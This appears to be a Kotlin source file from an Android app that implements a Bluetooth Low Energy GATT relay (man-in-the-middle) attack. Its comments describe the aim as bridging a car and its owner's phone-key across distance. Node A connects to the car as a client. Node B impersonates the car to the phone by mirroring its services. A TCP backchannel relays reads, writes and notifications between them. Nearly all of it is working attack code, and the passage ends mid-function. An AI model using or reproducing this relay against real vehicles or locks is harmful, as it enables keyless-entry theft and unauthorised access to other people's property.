package com.hereliesaz.blusnu.data

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCallback
import android.bluetooth.BluetoothGattCharacteristic
import android.bluetooth.BluetoothGattDescriptor
import android.bluetooth.BluetoothGattServer
import android.bluetooth.BluetoothGattServerCallback
import android.bluetooth.BluetoothGattService
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothProfile
import android.content.Context
import android.os.Build
import android.util.Log
import kotlinx.coroutines.CancellableContinuation
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeout
import java.io.DataInputStream
import java.io.DataOutputStream
import java.io.IOException
import java.net.InetAddress
import java.net.ServerSocket
import java.net.Socket
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

/**
 * Defines the role of this device in the GATT Relay attack topology.
 *
 * A Relay Attack uses two attacking devices bridging a large physical distance
 * between a legitimate peripheral (e.g., a Car) and a legitimate central
 * (e.g., a Phone/Key).
 */
enum class RelayRole {
    /** Near the "Lock" (e.g., the Car). Spoofs the Phone to the Car. */
    NODE_A_CAR_SIDE,

    /** Near the "Key" (e.g., the Phone/Owner). Spoofs the Car to the Phone. */
    NODE_B_PHONE_SIDE
}

/**
 * GATT Relay (Man-in-the-Middle) attack module.
 *
 * Coordinates the relaying of GATT packets between two attacker nodes.
 * Node A connects as a GATT client to the target peripheral and opens a TCP
 * server as the backchannel. Node B connects to Node A over TCP and mirrors
 * the discovered services on a local GATT server so the victim central
 * connects to it.
 *
 * TCP backchannel uses length-prefixed framing with a single-byte message type.
 * When [sharedSecret] is non-empty, an HMAC-SHA256 handshake authenticates the
 * TCP connection before any relay traffic is exchanged. The backchannel is
 * plaintext (no TLS) -- use on a trusted network only.
 *
 * @param context Application context for Bluetooth system service access.
 * @param backchannelPort TCP port for the relay backchannel between the two nodes.
 * @param bindAddress IP address the Node A TCP server binds to.
 * @param sharedSecret Passphrase for HMAC-SHA256 backchannel authentication.
 *                     Empty string disables authentication.
 */
@SuppressLint("MissingPermission")
class GattRelayModule(
    private val context: Context,
    private val backchannelPort: Int = DEFAULT_BACKCHANNEL_PORT,
    private val bindAddress: String = DEFAULT_BIND_ADDRESS,
    private val sharedSecret: String = ""
) {

    companion object {
        private const val TAG = "GattRelayModule"
        private const val DEFAULT_BACKCHANNEL_PORT = 9876
        private const val DEFAULT_BIND_ADDRESS = "0.0.0.0"

        // Protocol message types sent over the TCP backchannel.
        // Each TCP frame is: [1-byte type][type-specific payload].
        private const val MSG_SERVICE_DISCOVERY: Byte = 0x01
        private const val MSG_CHAR_READ_REQUEST: Byte = 0x02
        private const val MSG_CHAR_READ_RESPONSE: Byte = 0x03
        private const val MSG_CHAR_WRITE_REQUEST: Byte = 0x04
        private const val MSG_CHAR_WRITE_RESPONSE: Byte = 0x05
        private const val MSG_NOTIFICATION: Byte = 0x06

        private const val READ_TIMEOUT_MS = 5000L
        private const val WRITE_TIMEOUT_MS = 5000L
        private const val SERVICE_ADD_TIMEOUT_MS = 2000L
        private const val DESCRIPTOR_WRITE_TIMEOUT_MS = 2000L

        /** Client Characteristic Configuration Descriptor UUID. */
        private val CCCD_UUID: UUID = UUID.fromString("00002902-0000-1000-8000-00805f9b34fb")

        /**
         * Computes HMAC-SHA256 of a fixed challenge string keyed by [secret].
         * Used for TCP backchannel authentication.
         */
        internal fun computeHmac(secret: String): ByteArray {
            val mac = Mac.getInstance("HmacSHA256")
            mac.init(SecretKeySpec(secret.toByteArray(Charsets.UTF_8), "HmacSHA256"))
            return mac.doFinal("BluSnu-GATT-Relay".toByteArray(Charsets.UTF_8))
        }
    }

    // ── Queued GATT server requests ──────────────────────────────────────────

    /**
     * Queued GATT server requests from the Binder thread, processed on
     * Dispatchers.IO by the single processing coroutine.
     */
    private sealed class GattRequest {
        data class CharReadRequest(
            val device: BluetoothDevice,
            val requestId: Int,
            val offset: Int,
            val serviceUuid: UUID,
            val charUuid: UUID
        ) : GattRequest()

        data class CharWriteRequest(
            val device: BluetoothDevice,
            val requestId: Int,
            val offset: Int,
            val responseNeeded: Boolean,
            val serviceUuid: UUID,
            val charUuid: UUID,
            val data: ByteArray
        ) : GattRequest()
    }

    // ── Safe continuation resume ─────────────────────────────────────────────

    /**
     * Resumes a [CancellableContinuation] only if it is still active,
     * preventing IllegalStateException when a timeout has already cancelled it.
     */
    private fun <T> CancellableContinuation<T>.safeResume(value: T) {
        val token = tryResume(value)
        if (token != null) completeResume(token)
    }

    // ── GATT client callback (Node A) ────────────────────────────────────────

    /**
     * Shared callback for GATT client operations: connection, service discovery,
     * characteristic reads/writes, descriptor writes, and notifications.
     *
     * Continuation fields are @Volatile because callbacks fire on the Binder
     * thread while the suspending callers run on Dispatchers.IO.
     */
    private inner class GattRelayCallback : BluetoothGattCallback() {
        @Volatile
        var connectionContinuation: CancellableContinuation<BluetoothGatt?>? = null

        @Volatile
        var discoveryContinuation: CancellableContinuation<Boolean>? = null

        @Volatile
        var readContinuation: CancellableContinuation<ByteArray>? = null

        @Volatile
        var writeContinuation: CancellableContinuation<Int>? = null

        @Volatile
        var descriptorWriteContinuation: CancellableContinuation<Boolean>? = null

        override fun onConnectionStateChange(gatt: BluetoothGatt?, status: Int, newState: Int) {
            if (newState == BluetoothProfile.STATE_CONNECTED) {
                val cont = connectionContinuation
                connectionContinuation = null
                cont?.safeResume(gatt)
            } else if (newState == BluetoothProfile.STATE_DISCONNECTED && status != BluetoothGatt.GATT_SUCCESS) {
                gatt?.close()
                val cont = connectionContinuation
                connectionContinuation = null
                cont?.safeResume(null)
            }
        }

        override fun onServicesDiscovered(gatt: BluetoothGatt?, status: Int) {
            val cont = discoveryContinuation
            discoveryContinuation = null
            cont?.safeResume(status == BluetoothGatt.GATT_SUCCESS)
        }

        // Pre-TIRAMISU read callback: data lives in characteristic.value
        @Suppress("DEPRECATION")
        override fun onCharacteristicRead(
            gatt: BluetoothGatt,
            characteristic: BluetoothGattCharacteristic,
            status: Int
        ) {
            val data = if (status == BluetoothGatt.GATT_SUCCESS) {
                characteristic.value ?: ByteArray(0)
            } else {
                ByteArray(0)
            }
            val cont = readContinuation
            readContinuation = null
            cont?.safeResume(data)
        }

        // TIRAMISU+ read callback: data is in the value parameter
        override fun onCharacteristicRead(
            gatt: BluetoothGatt,
            characteristic: BluetoothGattCharacteristic,
            value: ByteArray,
            status: Int
        ) {
            val data = if (status == BluetoothGatt.GATT_SUCCESS) value else ByteArray(0)
            val cont = readContinuation
            readContinuation = null
            cont?.safeResume(data)
        }

        override fun onCharacteristicWrite(
            gatt: BluetoothGatt,
            characteristic: BluetoothGattCharacteristic,
            status: Int
        ) {
            val cont = writeContinuation
            writeContinuation = null
            cont?.safeResume(status)
        }

        override fun onDescriptorWrite(
            gatt: BluetoothGatt,
            descriptor: BluetoothGattDescriptor,
            status: Int
        ) {
            val cont = descriptorWriteContinuation
            descriptorWriteContinuation = null
            cont?.safeResume(status == BluetoothGatt.GATT_SUCCESS)
        }

        // Pre-TIRAMISU notification callback: data lives in characteristic.value
        @Suppress("DEPRECATION")
        override fun onCharacteristicChanged(
            gatt: BluetoothGatt,
            characteristic: BluetoothGattCharacteristic
        ) {
            val value = characteristic.value ?: return
            val serviceUuid = characteristic.service?.uuid ?: return
            forwardNotification(serviceUuid, characteristic.uuid, value)
        }

        // TIRAMISU+ notification callback: data is in the value parameter
        override fun onCharacteristicChanged(
            gatt: BluetoothGatt,
            characteristic: BluetoothGattCharacteristic,
            value: ByteArray
        ) {
            val serviceUuid = characteristic.service?.uuid ?: return
            forwardNotification(serviceUuid, characteristic.uuid, value)
        }
    }

    // ── Fields ───────────────────────────────────────────────────────────────

    private val bluetoothManager: BluetoothManager? by lazy {
        context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
    }
    private val bluetoothAdapter: BluetoothAdapter? by lazy { bluetoothManager?.adapter }

    @Volatile private var gattClient: BluetoothGatt? = null
    @Volatile private var gattServer: BluetoothGattServer? = null
    @Volatile private var tcpServerSocket: ServerSocket? = null
    @Volatile private var tcpSocket: Socket? = null
    @Volatile private var gattRelayCallback: GattRelayCallback? = null

    // Node A: TCP output stream and write lock for notification forwarding
    @Volatile private var tcpDataOut: DataOutputStream? = null
    private val tcpWriteLock = Any()
    @Volatile private var notificationScope: CoroutineScope? = null

    // Node B: demultiplexing TCP responses via CompletableDeferred
    @Volatile private var pendingReadResponse: CompletableDeferred<ByteArray>? = null
    @Volatile private var pendingWriteResponse: CompletableDeferred<Int>? = null

    // Node B: sequential service addition via onServiceAdded callback
    @Volatile private var serviceAddContinuation: CancellableContinuation<Boolean>? = null

    // Synchronized cleanup
    private val isClosed = AtomicBoolean(false)

    // ── Public API ───────────────────────────────────────────────────────────

    /**
     * Starts the relay operation based on the selected role.
     *
     * @param role The role this device is playing (Near Car or Near Phone).
     * @param targetAddress For Node A: BLE MAC of the target peripheral.
     *                      For Node B: IP address of Node A's TCP server.
     * @return A Flow of status logs.
     */
    fun startRelay(role: RelayRole, targetAddress: String): Flow<String> = flow {
        emit("Initializing GATT Relay as $role...")

        if (bluetoothManager == null || bluetoothAdapter == null) {
            emit("ERROR: Bluetooth not available on this device.")
            return@flow
        }

        when (role) {
            RelayRole.NODE_A_CAR_SIDE -> runNodeA(targetAddress).collect { emit(it) }
            RelayRole.NODE_B_PHONE_SIDE -> runNodeB(targetAddress).collect { emit(it) }
        }
    }.flowOn(Dispatchers.IO)

    /**
     * Stops the relay and releases all resources.
     */
    fun stop() {
        cleanup()
    }

    // ── Node A ───────────────────────────────────────────────────────────────

    /**
     * Node A: Near the target peripheral (e.g., car).
     * 1. Connects as GATT client to the target device
     * 2. Discovers its services
     * 3. Opens a TCP server socket for the backchannel
     * 4. Authenticates the TCP connection (if shared secret is set)
     * 5. Sends service discovery data to Node B
     * 6. Enables notifications on target characteristics (sequential descriptor writes)
     * 7. Runs single-threaded relay loop: reads requests from Node B, forwards to
     *    target, sends responses back. Notifications from the target are forwarded
     *    to Node B via the onCharacteristicChanged callback.
     */
    private fun runNodeA(targetAddress: String): Flow<String> = flow {
        val adapter = bluetoothAdapter ?: run {
            emit("ERROR: BluetoothAdapter not available.")
            return@flow
        }

        val targetDevice: BluetoothDevice = adapter.getRemoteDevice(targetAddress)
        emit("Connecting as GATT client to target peripheral $targetAddress...")

        val gattResult = connectGattClient(targetDevice)
        if (gattResult == null) {
            emit("ERROR: Failed to connect GATT client to $targetAddress.")
            return@flow
        }
        gattClient = gattResult
        emit("GATT client connected to $targetAddress.")

        emit("Discovering services on target peripheral...")
        val discoverySuccess = discoverServices(gattResult)
        if (!discoverySuccess) {
            emit("ERROR: Service discovery failed.")
            gattResult.close()
            return@flow
        }

        val services = gattResult.services
        emit("Discovered ${services.size} services on target peripheral.")
        for (service in services) {
            emit("  Service: ${service.uuid} (${service.characteristics.size} characteristics)")
        }

        // Open TCP server, binding to the configured address
        if (bindAddress == DEFAULT_BIND_ADDRESS) {
            emit("WARNING: TCP backchannel binding to 0.0.0.0 (all interfaces). " +
                    "Consider restricting to a specific interface IP.")
        }
        emit("Opening TCP backchannel server on $bindAddress:$backchannelPort...")
        try {
            tcpServerSocket = ServerSocket(backchannelPort, 1, InetAddress.getByName(bindAddress))
        } catch (e: IOException) {
            emit("ERROR: Failed to open TCP server on $bindAddress:$backchannelPort: ${e.message}")
            gattResult.close()
            return@flow
        }
        emit("TCP server listening. Waiting for Node B to connect...")

        val clientSocket = try {
            tcpServerSocket!!.accept()
        } catch (e: IOException) {
            emit("ERROR: TCP accept failed: ${e.message}")
            gattResult.close()
            return@flow
        }
        tcpSocket = clientSocket
        emit("Node B connected from ${clientSocket.inetAddress.hostAddress}.")

        val dataOut = DataOutputStream(clientSocket.getOutputStream())
        val dataIn = DataInputStream(clientSocket.getInputStream())

        // Authenticate the TCP connection
        if (sharedSecret.isNotEmpty()) {
            emit("Authenticating TCP connection...")
            if (!authenticateServer(dataIn, dataOut)) {
                emit("ERROR: TCP authentication failed. Node B provided wrong shared secret.")
                cleanup()
                return@flow
            }
            emit("TCP authentication successful.")
        } else {
            Log.w(TAG, "WARNING: No shared secret configured. " +
                    "TCP backchannel is unauthenticated and unencrypted.")
            emit("WARNING: TCP backchannel is unauthenticated. Set a shared secret for security.")
        }

        // Store TCP output for notification forwarding
        tcpDataOut = dataOut
        notificationScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

        // Send service discovery info to Node B
        emit("Sending service discovery data to Node B...")
        sendServiceDiscoveryToNodeB(dataOut, services)
        emit("Service discovery data sent.")

        // Enable notifications on all notifiable/indicatable characteristics,
        // writing each CCCD sequentially and awaiting the onDescriptorWrite callback.
        for (service in services) {
            for (characteristic in service.characteristics) {
                val isNotifiable = characteristic.properties and
                        BluetoothGattCharacteristic.PROPERTY_NOTIFY != 0
                val isIndicatable = characteristic.properties and
                        BluetoothGattCharacteristic.PROPERTY_INDICATE != 0
                if (isNotifiable || isIndicatable) {
                    gattResult.setCharacteristicNotification(characteristic, true)
                    val cccd = characteristic.getDescriptor(CCCD_UUID)
                    if (cccd != null) {
                        val enableValue = if (isNotifiable) {
                            BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE
                        } else {
                            BluetoothGattDescriptor.ENABLE_INDICATION_VALUE
                        }
                        try {
                            writeDescriptorAsync(gattResult, cccd, enableValue)
                            emit("  Enabled notifications for ${characteristic.uuid}")
                        } catch (e: Exception) {
                            if (e is CancellationException) throw e
                            emit("  WARNING: Failed to enable notifications for " +
                                    "${characteristic.uuid}: ${e.message}")
                        }
                    }
                }
            }
        }

        // Main relay loop: single reader on TCP, responses synchronized with
        // notification writes via tcpWriteLock.
        emit("Relay active. Forwarding GATT operations...")
        try {
            while (!clientSocket.isClosed) {
                val msgType = try {
                    dataIn.readByte()
                } catch (e: IOException) {
                    emit("Node B disconnected.")
                    break
                }

                when (msgType) {
                    MSG_CHAR_READ_REQUEST -> {
                        val serviceUuid = UUID.fromString(dataIn.readUTF())
                        val charUuid = UUID.fromString(dataIn.readUTF())
                        emit("Relay: Read request for $charUuid on service $serviceUuid")

                        val characteristic = gattResult.getService(serviceUuid)
                            ?.getCharacteristic(charUuid)

                        if (characteristic != null) {
                            try {
                                val value = readCharacteristicAsync(gattResult, characteristic)
                                synchronized(tcpWriteLock) {
                                    dataOut.writeByte(MSG_CHAR_READ_RESPONSE.toInt())
                                    dataOut.writeUTF(serviceUuid.toString())
                                    dataOut.writeUTF(charUuid.toString())
                                    dataOut.writeInt(value.size)
                                    dataOut.write(value)
                                    dataOut.flush()
                                }
                            } catch (e: Exception) {
                                if (e is CancellationException) throw e
                                emit("Read timed out for characteristic $charUuid")
                                synchronized(tcpWriteLock) {
                                    dataOut.writeByte(MSG_CHAR_READ_RESPONSE.toInt())
                                    dataOut.writeUTF(serviceUuid.toString())
                                    dataOut.writeUTF(charUuid.toString())
                                    dataOut.writeInt(0)
                                    dataOut.flush()
                                }
                            }
                        } else {
                            Log.w(TAG, "Unknown characteristic UUID: $charUuid " +
                                    "on service $serviceUuid")
                            emit("WARNING: Unknown characteristic $charUuid, " +
                                    "sending empty response")
                            synchronized(tcpWriteLock) {
                                dataOut.writeByte(MSG_CHAR_READ_RESPONSE.toInt())
                                dataOut.writeUTF(serviceUuid.toString())
                                dataOut.writeUTF(charUuid.toString())
                                dataOut.writeInt(0)
                                dataOut.flush()
                            }
                        }
                    }
                    MSG_CHAR_WRITE_REQUEST -> {
                        val serviceUuid = UUID.fromString(dataIn.readUTF())
                        val charUuid = UUID.fromString(dataIn.readUTF())
                        val dataLen = dataIn.readInt()
                        val writeData = ByteArray(dataLen)
                        dataIn.readFully(writeData)
                        emit("Relay: Write request for $charUuid ($dataLen bytes)")

                        val characteristic = gattResult.getService(serviceUuid)
                            ?.getCharacteristic(charUuid)

                        if (characteristic != null) {
                            try {
                                val writeStatus = writeCharacteristicAsync(
                                    gattResult, characteristic, writeData
                                )
                                synchronized(tcpWriteLock) {
                                    dataOut.writeByte(MSG_CHAR_WRITE_RESPONSE.toInt())
                                    dataOut.writeUTF(serviceUuid.toString())
                                    dataOut.writeUTF(charUuid.toString())
                                    dataOut.writeByte(writeStatus)
                                    dataOut.flush()
                                }
                            } catch (e: Exception) {
                                if (e is CancellationException) throw e
                                emit("Write failed for $charUuid: ${e.message}")
                                synchronized(tcpWriteLock) {
                                    dataOut.writeByte(MSG_CHAR_WRITE_RESPONSE.toInt())
                                    dataOut.writeUTF(serviceUuid.toString())
                                    dataOut.writeUTF(charUuid.toString())
                                    dataOut.writeByte(BluetoothGatt.GATT_FAILURE)
                                    dataOut.flush()
                                }
                            }
                        } else {
                            Log.w(TAG, "Unknown characteristic UUID: $charUuid " +
                                    "on service $serviceUuid")
                            emit("WARNING: Unknown characteristic $charUuid, " +
                                    "sending failure response")
                            synchronized(tcpWriteLock) {
                                dataOut.writeByte(MSG_CHAR_WRITE_RESPONSE.toInt())
                                dataOut.writeUTF(serviceUuid.toString())
                                dataOut.writeUTF(charUuid.toString())
                                dataOut.writeByte(BluetoothGatt.GATT_FAILURE)
                                dataOut.flush()
                            }
                        }
                    }
                }
            }
        } catch (e: IOException) {
            emit("Relay loop ended: ${e.message}")
        } finally {
            emit("Cleaning up Node A resources...")
            notificationScope?.cancel()
            notificationScope = null
            tcpDataOut = null
            cleanup()
        }
    }.flowOn(Dispatchers.IO)

    // ── Node B ───────────────────────────────────────────────────────────────

    /**
     * Node B: Near the victim central (e.g., the phone/owner).
     * 1. Connects to Node A over TCP
     * 2. Authenticates the TCP connection (if shared secret is set)
     * 3. Receives service discovery data from Node A
     * 4. Opens a local GATT server mirroring the target's services
     *    (services added sequentially, awaiting onServiceAdded per service)
     * 5. GATT server callbacks queue requests into a Channel
     * 6. A single TCP reader loop (this flow's main loop) reads ALL messages
     *    from Node A -- responses are dispatched to CompletableDeferreds,
     *    notifications are forwarded to connected victim devices
     * 7. A processing coroutine drains the Channel, sends requests over TCP,
     *    and awaits the response Deferreds
     *
     * This single-reader architecture avoids the framing corruption that would
     * result from two concurrent readers on the same TCP DataInputStream.
     */
    private fun runNodeB(targetAddress: String): Flow<String> = flow {
        val manager = bluetoothManager ?: run {
            emit("ERROR: BluetoothManager not available.")
            return@flow
        }

        emit("Connecting to Node A TCP backchannel at $targetAddress:$backchannelPort...")
        val socket: Socket
        try {
            socket = Socket(targetAddress, backchannelPort)
        } catch (e: IOException) {
            emit("ERROR: Failed to connect to Node A: ${e.message}")
            return@flow
        }
        tcpSocket = socket
        emit("Connected to Node A.")

        val dataIn = DataInputStream(socket.getInputStream())
        val dataOut = DataOutputStream(socket.getOutputStream())

        // Authenticate the TCP connection
        if (sharedSecret.isNotEmpty()) {
            emit("Authenticating TCP connection...")
            if (!authenticateClient(dataIn, dataOut)) {
                emit("ERROR: TCP authentication failed. Shared secret mismatch.")
                cleanup()
                return@flow
            }
            emit("TCP authentication successful.")
        } else {
            Log.w(TAG, "WARNING: No shared secret configured. " +
                    "TCP backchannel is unauthenticated and unencrypted.")
            emit("WARNING: TCP backchannel is unauthenticated. Set a shared secret for security.")
        }

        // Receive service discovery data from Node A
        emit("Receiving service discovery data from Node A...")
        val mirroredServices = receiveServiceDiscoveryFromNodeA(dataIn)
        emit("Received ${mirroredServices.size} services to mirror.")

        // Channel for queuing GATT requests off the Binder thread
        val gattRequestChannel = Channel<GattRequest>(Channel.UNLIMITED)

        // Set up local GATT server mirroring the target's services.
        // Callbacks enqueue requests into the channel and return immediately,
        // keeping blocking TCP I/O off the Binder thread.
        emit("Setting up mirrored GATT server...")
        val serverCallback = object : BluetoothGattServerCallback() {
            override fun onConnectionStateChange(
                device: BluetoothDevice?, status: Int, newState: Int
            ) {
                when (newState) {
                    BluetoothProfile.STATE_CONNECTED -> {
                        Log.i(TAG, "Victim central connected: ${device?.address}")
                    }
                    BluetoothProfile.STATE_DISCONNECTED -> {
                        Log.i(TAG, "Victim central disconnected: ${device?.address}")
                    }
                }
            }

            override fun onServiceAdded(status: Int, service: BluetoothGattService?) {
                val cont = serviceAddContinuation
                serviceAddContinuation = null
                cont?.safeResume(status == BluetoothGatt.GATT_SUCCESS)
            }

            override fun onCharacteristicReadRequest(
                device: BluetoothDevice?, requestId: Int, offset: Int,
                characteristic: BluetoothGattCharacteristic?
            ) {
                if (device == null || characteristic == null) return
                val service = characteristic.service ?: return
                gattRequestChannel.trySend(
                    GattRequest.CharReadRequest(
                        device = device,
                        requestId = requestId,
                        offset = offset,
                        serviceUuid = service.uuid,
                        charUuid = characteristic.uuid
                    )
                )
            }

            override fun onCharacteristicWriteRequest(
                device: BluetoothDevice?, requestId: Int,
                characteristic: BluetoothGattCharacteristic?,
                preparedWrite: Boolean, responseNeeded: Boolean,
                offset: Int, value: ByteArray?
            ) {
                if (device == null || characteristic == null) return
                val service = characteristic.service ?: return
                gattRequestChannel.trySend(
                    GattRequest.CharWriteRequest(
                        device = device,
                        requestId = requestId,
                        offset = offset,
                        responseNeeded = responseNeeded,
                        serviceUuid = service.uuid,
                        charUuid = characteristic.uuid,
                        data = value ?: ByteArray(0)
                    )
                )
            }

            override fun onDescriptorReadRequest(
                device: BluetoothDevice?, requestId: Int, offset: Int,
                descriptor: BluetoothGattDescriptor?
            ) {
                device ?: return
                val value = descriptor?.value
                    ?: BluetoothGattDescriptor.DISABLE_NOTIFICATION_VALUE
                gattServer?.sendResponse(
                    device, requestId, BluetoothGatt.GATT_SUCCESS, offset, value
                )
            }

            override fun onDescriptorWriteRequest(
                device: BluetoothDevice?, requestId: Int,
                descriptor: BluetoothGattDescriptor?,
                preparedWrite: Boolean, responseNeeded: Boolean,
                offset: Int, value: ByteArray?
            ) {
                device ?: return
                if (descriptor != null) {
                    descriptor.value = value
                }
                if (responseNeeded) {
                    gattServer?.sendResponse(
                        device, requestId, BluetoothGatt.GATT_SUCCESS, 0, null
                    )
                }
            }
        }

        gattServer = manager.openGattServer(context, serverCallback)
        if (gattServer == null) {
            emit("ERROR: Failed to open GATT server.")
            socket.close()
            return@flow
        }

        // Add mirrored services sequentially, awaiting onServiceAdded per service.
        for (service in mirroredServices) {
            try {
                val success = addServiceAsync(gattServer!!, service)
                if (success) {
                    emit("  Added service: ${service.uuid}")
                } else {
                    emit("  WARNING: Failed to add service ${service.uuid}")
                }
            } catch (e: Exception) {
                if (e is CancellationException) throw e
                emit("  WARNING: Timeout adding service ${service.uuid}: ${e.message}")
            }
        }
        emit("GATT server ready with ${mirroredServices.size} mirrored services. " +
                "Waiting for victim central...")

        // Processing coroutine: drains GATT request channel, sends requests
        // to Node A over TCP, and awaits responses via CompletableDeferreds.
        val processingScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        processingScope.launch {
            for (request in gattRequestChannel) {
                try {
                    when (request) {
                        is GattRequest.CharReadRequest -> {
                            // Create deferred BEFORE sending the request
                            val deferred = CompletableDeferred<ByteArray>()
                            pendingReadResponse = deferred

                            dataOut.writeByte(MSG_CHAR_READ_REQUEST.toInt())
                            dataOut.writeUTF(request.serviceUuid.toString())
                            dataOut.writeUTF(request.charUuid.toString())
                            dataOut.flush()

                            val data = try {
                                withTimeout(READ_TIMEOUT_MS) { deferred.await() }
                            } catch (e: Exception) {
                                if (e is CancellationException) throw e
                                Log.w(TAG, "Read response timed out for " +
                                        "${request.charUuid}")
                                ByteArray(0)
                            } finally {
                                pendingReadResponse = null
                            }

                            gattServer?.sendResponse(
                                request.device, request.requestId,
                                if (data.isNotEmpty()) BluetoothGatt.GATT_SUCCESS
                                else BluetoothGatt.GATT_FAILURE,
                                request.offset, data
                            )
                        }
                        is GattRequest.CharWriteRequest -> {
                            dataOut.writeByte(MSG_CHAR_WRITE_REQUEST.toInt())
                            dataOut.writeUTF(request.serviceUuid.toString())
                            dataOut.writeUTF(request.charUuid.toString())
                            dataOut.writeInt(request.data.size)
                            dataOut.write(request.data)
                            dataOut.flush()

                            if (request.responseNeeded) {
                                val deferred = CompletableDeferred<Int>()
                                pendingWriteResponse = deferred

                                val status = try {
                                    withTimeout(WRITE_TIMEOUT_MS) { deferred.await() }
                                } catch (e: Exception) {
                                    if (e is CancellationException) throw e
                                    Log.w(TAG, "Write response timed out for " +
                                            "${request.charUuid}")
                                    BluetoothGatt.GATT_FAILURE
                                } finally {
                                    pendingWriteResponse = null
                                }

                                gattServer?.sendResponse(
                                    request.device, request.requestId,
                                    status, request.offset, null
                                )
                            }
                        }
                    }
                } catch (e: IOException) {
                    Log.e(TAG, "Error processing GATT request", e)
                    sendErrorResponse(request)
                } catch (e: Exception) {
                    if (e is CancellationException) throw e
                    Log.e(TAG, "Unexpected error processing GATT request", e)
                    sendErrorResponse(request)
                }
            }
        }

        // Single TCP reader loop: reads ALL messages from Node A and dispatches.
        // Responses are completed on the pending CompletableDeferreds.
        // Notifications are forwarded to connected victim devices.
        // This avoids having two concurrent readers on the same DataInputStream.
        try {
            while (!socket.isClosed) {
                val msgType = try {
                    dataIn.readByte()
                } catch (e: IOException) {
                    emit("Node A disconnected.")
                    break
                }

                when (msgType) {
                    MSG_CHAR_READ_RESPONSE -> {
                        dataIn.readUTF() // service UUID (consumed for framing)
                        dataIn.readUTF() // char UUID (consumed for framing)
                        val dataLen = dataIn.readInt()
                        val data = ByteArray(dataLen)
                        if (dataLen > 0) dataIn.readFully(data)
                        pendingReadResponse?.complete(data)
                    }
                    MSG_CHAR_WRITE_RESPONSE -> {
                        dataIn.readUTF() // service UUID (consumed for framing)
                        dataIn.readUTF() // char UUID (consumed for framing)
                        val status = dataIn.readByte().toInt()
                        pendingWriteResponse?.complete(status)
                    }
                    MSG_NOTIFICATION -> {
                        val serviceUuid = UUID.fromString(dataIn.readUTF())
                        val charUuid = UUID.fromString(dataIn.readUTF())
                        val dataLen = dataIn.readInt()
                        val notifyData = ByteArray(dataLen)
                        if (dataLen > 0) dataIn.readFully(notifyData)

                        // Forward notification to connected victim central
                        val mirroredChar = gattServer?.getService(serviceUuid)
                            ?.getCharacteristic(charUuid)
                        if (mirroredChar != null) {
                            mirroredChar.value = notifyData
                            val connectedDevices = manager.getConnectedDevices(
                                BluetoothProfile.GATT_SERVER
                            )
                            for (connectedDevice in connectedDevices) {
                                gattServer?.notifyCharacteristicChanged(
                                    connectedDevice, mirroredChar, false
                                )
                            }
                            emit("Relay: Forwarded notification for $charUuid " +
                                    "to ${connectedDevices.size} device(s)")
                        }
                    }
                }
            }
        } catch (e: IOException) {
            emit("Node B relay loop ended: ${e.message}")
        } finally {
            emit("Cleaning up Node B resources...")
            processingScope.cancel()
            gattRequestChannel.close()
            cleanup()
        }
    }.flowOn(Dispatchers.IO)

    // ── Async BLE helpers ────────────────────────────────────────────────────

    /**
     * Reads a characteristic from the target peripheral asynchronously,
     * suspending until the onCharacteristicRead callback fires.
     * Times out after [READ_TIMEOUT_MS] to prevent indefinite hangs.
     */
    private suspend fun readCharacteristicAsync(
        gatt: BluetoothGatt,
        characteristic: BluetoothGattCharacteristic
    ): ByteArray {
        val callback = gattRelayCallback ?: return ByteArray(0)
        return withTimeout(READ_TIMEOUT_MS) {
            suspendCancellableCoroutine { cont ->
                callback.readContinuation = cont
                cont.invokeOnCancellation { callback.readContinuation = null }
                gatt.readCharacteristic(characteristic)
            }
        }
    }

    /**
     * Writes a characteristic to the target peripheral asynchronously,
     * suspending until the onCharacteristicWrite callback fires with the
     * actual GATT status from the remote device.
     * Times out after [WRITE_TIMEOUT_MS].
     *
     * @return GATT status code (e.g., [BluetoothGatt.GATT_SUCCESS]).
     */
    private suspend fun writeCharacteristicAsync(
        gatt: BluetoothGatt,
        characteristic: BluetoothGattCharacteristic,
        data: ByteArray
    ): Int {
        val callback = gattRelayCallback ?: return BluetoothGatt.GATT_FAILURE
        return withTimeout(WRITE_TIMEOUT_MS) {
            suspendCancellableCoroutine { cont ->
                callback.writeContinuation = cont
                cont.invokeOnCancellation { callback.writeContinuation = null }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    val result = gatt.writeCharacteristic(
                        characteristic, data,
                        BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT
                    )
                    if (result != BluetoothGatt.GATT_SUCCESS) {
                        callback.writeContinuation = null
                        cont.safeResume(BluetoothGatt.GATT_FAILURE)
                    }
                } else {
                    @Suppress("DEPRECATION")
                    characteristic.value = data
                    @Suppress("DEPRECATION")
                    val success = gatt.writeCharacteristic(characteristic)
                    if (!success) {
                        callback.writeContinuation = null
                        cont.safeResume(BluetoothGatt.GATT_FAILURE)
                    }
                }
            }
        }
    }

    /**
     * Writes a descriptor value asynchronously, suspending until the
     * onDescriptorWrite callback fires. Times out after
     * [DESCRIPTOR_WRITE_TIMEOUT_MS].
     */
    private suspend fun writeDescriptorAsync(
        gatt: BluetoothGatt,
        descriptor: BluetoothGattDescriptor,
        value: ByteArray
    ): Boolean {
        val callback = gattRelayCallback ?: return false
        return withTimeout(DESCRIPTOR_WRITE_TIMEOUT_MS) {
            suspendCancellableCoroutine { cont ->
                callback.descriptorWriteContinuation = cont
                cont.invokeOnCancellation { callback.descriptorWriteContinuation = null }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
